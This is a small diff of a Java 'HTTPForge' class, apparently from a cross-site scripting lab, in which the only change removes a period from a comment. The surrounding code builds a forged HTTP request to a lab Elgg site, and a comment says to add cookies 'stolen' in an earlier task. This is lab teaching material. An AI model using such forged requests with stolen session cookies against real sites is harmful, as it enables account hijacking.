@@ -20,7 +20,7 @@ public class HTTPForge {
 // addRequestProperty method is used to add HTTP Header Information.
 // Here we add User-Agent HTTP header to the forged HTTP packet.
 // Add other necessary HTTP Headers yourself. Cookies should be stolen
-// using the method in task3.
+// using the method in task3
 		urlConn.addRequestProperty("Host","www.xsslabelgg.com");
 		urlConn.addRequestProperty("User-agent","Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0");
 		urlConn.addRequestProperty("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
